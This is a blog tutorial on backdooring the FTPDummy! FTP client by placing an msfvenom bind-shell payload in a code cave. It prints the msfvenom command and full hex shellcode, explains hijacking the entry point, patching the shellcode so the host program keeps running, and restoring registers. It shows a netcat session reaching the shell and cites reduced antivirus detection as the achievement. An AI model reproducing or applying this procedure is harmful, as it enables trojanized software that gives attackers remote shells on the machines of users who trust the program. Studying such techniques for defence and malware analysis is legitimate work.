---
title: Backdooring PE Files through Code Caves
author: fwinsnes
date: 2020-10-20 13:44:00 +0800
categories: [Backdooring]
tags: [assembly, shellcoding]
---

### Introduction

Building malware is a topic which has always been from great interest to me. However, injecting malicious code within benign software seems a very concerning yet engrossing 
concept. PE Injection is pretty much the aforementioned example, embedding shellcode into a non-used fragment of code within a program which is commonly not flagged as a 
program.

Normally, in order to achieve PE Injection or simply backdooring, there are two methods:

+ Adding a new header with empty space into the program, through programs such as PE Lord or CFF Explorer.
+ Using a Code Cave. An original section of the code which is not relevant to the execution.

During this tutorial, i will exhibit the latter, this is due to the fact that adding a new header is very noisy regarding space when read by AV Software. On the other hand, Code 
Caves do not change space whatsoever, as the space is already being used, and there are no new headers.

##### Time to get our hands dirty.

Through the course of this post i will use FTPDummy! FTP Client to explain such concept, due to the reason that it is fast, lightweight, easy to use and does not have ASLR 
enabled on the main module, making things a little easier. You can get it [here](http://www.dummysoftware.com/ftpdummy.html).

![](/assets/img/Code_Cave/1.png)
###### Main menu of FTPDummy!

In addition, i will be using VirusTotal in order to check how many AV Software products are capable of detecting the PE File.

![](/assets/img/Code_Cave/2.png)
###### FTPDummy! when checked by VirusTotal.

Furthermore, when it comes to finding code caves, i have chosen [pycave.py](https://github.com/axcheron/pycave), it requires Python 3.8 and the module [PEFile](https://pypi.org/project/pefile/).

![](/assets/img/Code_Cave/3.png)
###### Revealed Code Caves

As revealed on the image, there are several Code Caves in the .rsrc section. In order to not worry at all with space issues, i'll use 0x0052715E as it has 2814 bytes of spaces, 
according to pycave.py.

#### The Process

Before stepping into how the backdooring is done, i think the whole process should be explained clearly.

In order to backdoor, the following steps must be taken:

+ The flow must be hijacked. This can be achieved through several methods I.E Replacing the entry point instruction for a JMP instruction pointing into the desired Code Cave. 
Also, more specific hijacking can be achieved, such as executing the JMP when executing a section of the code (I.E: Open Help, URL, Credits, or any other button). Nevertheless, 
due to the complexity of this last technique, it shall be reserved for the following post.

Once EIP points towards the Code Cave, the next combination of instructions must be assembled.

+ PUSHAD/PUSHFD instructions. These will save our registers/flags so that they are aligned later on. It is essential for the registers/flags to be aligned so that the 
instructions work perfectly according to the value of these.
+ The Shellcode. Shellcode, we are used to it. Some modifications may need to be issued, such as the removal of the last instruction in some cases, as it tends to crash the flow 
and the modification of a byte which waits for the shellcode to exit for the main program to return its original flow.
+ Alignment. The ESP Register must be restored to its old value.
+ POPFD/POPAD. These instructions will restore our registers/flags.
+ As when assembling the JMP on the entry point instruction some other instructions were replaced, these must be assembled once again so that the code runs as intended and does 
not crash!

As explained previously, the initial instructions must be re-assembled later on. Due to this, these are saved.

![](/assets/img/Code_Cave/4.png)
###### The instructions are copied

Moreover, the JMP instruction pointing to the Code Cave is assembled.

![](/assets/img/Code_Cave/5.png)

As seen on the image, the instructions PUSH EBP, MOV EBP, ESP and PUSH -1 were the only affected.

As it is required to save our progress (otherwise it would be pretty tiring to re-do every step), it can be saved by using the option "Copy to executable".

![](/assets/img/Code_Cave/6.png)

Select what you desired to save and click on "Save file".

![](/assets/img/Code_Cave/7.png)

![](/assets/img/Code_Cave/8.png)

Once the altered PE File is loaded, we now see that the JMP instruction is loaded as original.

![](/assets/img/Code_Cave/9.png)

If it is stepped into the instruction (SHIFT+F7), the execution leads to the Code Caves:

![](/assets/img/Code_Cave/10.png)

Before assembling the required instructions (PUSHAD/PUSHFD), assembling some NOPs can't hurt anyone, just in case the execution does not get mangled.

![](/assets/img/Code_Cave/11.png)

#### Where the fun is born

The following step is introducing the shellcode. In this scenario, i have chosen a bind shell from msfvenom. Furthermore, in order to paste it into the debugger through a binary copy, the format must be hex.

```term
root@whitecr0wz:~# msfvenom -p windows/shell_bind_tcp LPORT=9000 -f hex 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 328 bytes
Final size of hex file: 656 bytes
fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f
6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a085950e2fd
4050405068ea0fdfe0ffd597680200232889e66a10565768c2db3767ffd55768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545
056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5
```

If this program is submitted within the .exe format VirusTotal, it gives the following result.

![](/assets/img/Code_Cave/payload_detected.png)

The empty space is selected and a binary paste is arranged.

![](/assets/img/Code_Cave/12.png)

The code seems to have been pasted as expected.

![](/assets/img/Code_Cave/13.png)

Now, on these circumstances, if we desired to follow the execution, the shellcode would be executed perfectly well. Nevertheless, the program would not, crashing whenever the 
shellcode exits. Let's put this to the test.

If the execution is run (SHIFT+F9), the shellcode will be executed.



![](/assets/img/Code_Cave/14.png)

```term
root@whitecr0wz:~# rlwrap nc 192.168.100.149 9000 -v 
192.168.100.149: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.100.149] 9000 (?) open
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\IEUser\Desktop2\FTPDummy_Code_Cave>
```

However, once exited, the program is terminated.

![](/assets/img/Code_Cave/15.png)

Note: As explained previously, the shellcode will require some modifications. In this case, the program execution will not continue unless the shellcode has finished, in order 
to change this, replace the instruction commonly given in msfvenom payloads DEC ESI (4E), for a NOP.

![](/assets/img/Code_Cave/16.png)

![](/assets/img/Code_Cave/17.png)

The next footstep on this technique is quite tricky, but quite simple. It consists in aligning the ESP value, i have done a small guide [here](https://whitecr0wz.github.io/posts/Alignments-on-windows-registers/).

To put it very simple, a breakpoint must be inserted at the start of the payload and at the ending of such. Then, the difference between of these two values of ESP is calculated and added into the Register.

Note: Another modification must be issued into the shellcode, being this one a NOP on the last instruction (CALL EBP). This is due to the fact that CALL EBP will end the execution.

![](/assets/img/Code_Cave/20.png)

![](/assets/img/Code_Cave/21.png)

We see values 0x0012FF68 and 0x0012FD68. This easy problem can be solved with a program:

```term
#!/bin/bash

printf "0x%X\n" $(($1 - $2)
```

The calculation is done.

```term
root@whitecr0wz:~# hexcalc 0x0012FF68 0x0012FD68
0x200
root@whitecr0wz:~#
```

As the value is 0x200, the instruction should be "ADD ESP, 0x200"

![](/assets/img/Code_Cave/22.png)

If you remember well, at the start of the post it was stated that it is required to re-assemble the replaced instructions for the JMP to the Code Cave. These were PUSH EBP, MOV 
EBP, ESP and PUSH -1. Finally, a JMP instruction shall be assembled to the next instruction of the original chain, which is, in our case, a PUSH instruction.

![](/assets/img/Code_Cave/24.png)

![](/assets/img/Code_Cave/25.png)

![](/assets/img/Code_Cave/26.png)

![](/assets/img/Code_Cave/27.png)

Note: In these scenarios, a sign that the alignment was issued with no mistakes is the fact that the value of ESP is equal when the execution began.

If the program is run and the flow resumes (SHIFT+F9), we see that the bind shellcode is arranged and FTPDummy! boots up when it is interacted with the shellcode.

![](/assets/img/Code_Cave/28.png)

#### Escaping from the cat.

Remember, when we first scanned our payload through Virus Total, it gave a result of 57/70. Let's check how many AV Software products manage to flag our new PE File as malware.

![](/assets/img/Code_Cave/29.png)

Even though there is much to work, from 57 to 26 is a great improvement. On the following post i will be explaining this same technique within profound sections of the program 
with encoding as well.

Here is the PoC for you to enjoy. Thanks for reading!

![](/assets/img/Code_Cave/30.gif)

### References

Capt. Meelo's post: [https://captmeelo.com/exploitdev/osceprep/2018/07/21/backdoor101-part2.html](https://captmeelo.com/exploitdev/osceprep/2018/07/21/backdoor101-part2.html).

Online x86/x64 Assembler/Disassembler: [https://defuse.ca/online-x86-assembler.htm#disassembly2](https://defuse.ca/online-x86-assembler.htm#disassembly2).
